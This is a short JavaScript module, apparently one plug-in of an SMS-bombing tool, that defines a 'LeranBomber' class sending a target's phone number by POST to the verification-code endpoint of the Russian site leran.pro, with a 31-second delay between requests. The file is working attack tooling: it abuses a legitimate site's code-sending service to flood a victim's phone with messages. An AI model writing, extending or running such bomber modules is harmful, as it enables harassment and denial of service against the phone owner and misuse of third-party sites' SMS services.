const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class LeranBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = this.formUrlEncoded({
            phone: this.phone
        });
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "leran";
    delay = 31000;
    url = 'https://www.leran.pro/user/sendCode/';  
}
module.exports = LeranBomber;